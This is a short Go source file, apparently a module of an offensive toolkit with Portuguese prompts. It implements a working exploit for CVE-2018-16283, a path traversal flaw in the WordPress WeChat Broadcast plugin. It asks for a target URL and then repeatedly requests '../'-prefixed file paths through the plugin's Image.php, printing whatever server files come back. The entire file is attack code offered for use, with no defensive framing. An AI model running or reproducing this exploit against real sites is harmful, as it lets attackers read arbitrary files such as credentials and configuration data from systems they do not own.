package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

//CVE201816283 ...
func CVE201816283() {
	var url, file string

	fmt.Printf("Url: ")
	fmt.Scanf("%s", &url)
	client := &http.Client{}
	for true {
		fmt.Printf("Arquivo: ")
		fmt.Scanf("%s", &file)
		if file == "exit.Snake" {
			break
		}
		req, _ := http.NewRequest("GET", url+"/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../.."+file, nil)
		resp, _ := client.Do(req)
		body, _ := ioutil.ReadAll(resp.Body)
		result := string(body)
		fmt.Println(result)
		fmt.Printf("\nDigite 'exit.Snake' para sair do modulo\n\n")
	}
}
